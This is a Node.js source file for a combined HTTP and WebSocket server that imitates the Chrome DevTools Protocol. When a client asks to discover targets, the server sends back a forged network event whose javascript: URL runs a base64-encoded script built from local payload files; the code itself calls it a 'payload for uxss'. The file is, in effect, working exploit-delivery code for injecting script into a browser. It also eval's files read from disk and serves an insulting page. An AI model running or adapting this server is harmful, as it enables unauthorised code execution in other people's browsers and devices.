import { WebSocketServer } from "ws";
import { createServer } from "http";
import finalhandler from "finalhandler";
import serveStatic from "serve-static";
import * as readline from 'readline-sync';
import * as fs from "fs";
import path from "path";

const WebSocket_port = 8080;
const HTTP_port = 9123;

// Serve static files
const serve = serveStatic("./");

// Custom HTML page to show when visiting WebSocket port as a regular HTTP request
const customHtmlPage = `
    <h1>read the documentation you fucking idiot</h1>
    <p>you arent supposed to open this page as a regular http site</p>
`;

let globalUID = 0;
let sessionId = "89AC63D12B18F3EE9808C13899C9B695";

// Reading the server configuration
let serverConfig = "{\"updater_url\": \"rigtools.asyncsmasher.com\"}";
try {
    serverConfig = fs.readFileSync('server_config.json');
} catch (e) {
    console.log(`Using default update url ${JSON.parse(serverConfig).updater_url} because it failed to read the file: \n${e}`);
}

// Create a single server to handle both HTTP and WebSocket
const server = createServer((req, res) => {
    // Check if the request is a WebSocket upgrade request
    if (req.headers.upgrade && req.headers.upgrade.toLowerCase() === 'websocket') {
        return;
    }
    
    // Serve the custom HTML page for normal HTTP requests
    res.setHeader("Content-Type", "text/html");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.writeHead(200);
    res.end(customHtmlPage);
});

// WebSocket server
const wss = new WebSocketServer({ server });

wss.on("connection", function connection(wss_con) {
    wss_con.on("message", async (msg) => {
        const result = {
            payload1: eval(fs.readFileSync('payload.mjs'))
        }
        let htmlFile = fs.readFileSync(new URL('./payloads/index.html', import.meta.url)).toString();
        htmlFile.replace('`', '&#96;');
        let jsFile = fs.readFileSync(new URL('./payloads/index.js', import.meta.url)).toString();
        let json_msg = JSON.parse(msg.toString());
        let { id, method, params } = json_msg;
        console.log(id + "> ", method, params);
        const entry = fs.readFileSync('./entry/entry.html');

        if (method === "Target.setDiscoverTargets") {
            wss_con.send(
                JSON.stringify({
                    method: "Network.requestWillBeSent",
                    params: {
                        request: {
                            url: `javascript: (function () {eval(atob("${btoa(`(${result.payload1.toString().replace("%%EXTJS%%", btoa(jsFile)).replace("%%EXTHTML%%", btoa(htmlFile)).replace(/%%updaterurl%%/g, JSON.parse(serverConfig).updater_url).replace('%%HTMLENTRY%%', btoa(entry.toString()))})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
                        },
                    },
                }),
            );
        }

        wss_con.send(
            JSON.stringify({
                id: id,
                error: null,
                sessionId: sessionId,
                result: {},
            }),
        );
    });
});

// Start the server for both WebSocket and HTTP
server.listen(WebSocket_port, () => {
    console.log(`Server running and WebSocket accessible at ws://localhost:${WebSocket_port}`);
});

createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    serve(req, res, finalhandler(req, res));
}).listen(HTTP_port);

console.log(`The HTTP server is accessible at http://localhost:${HTTP_port}\n--------`);
console.log(`The WebSocket is accessible at ws://localhost:${WebSocket_port}\n--------`);
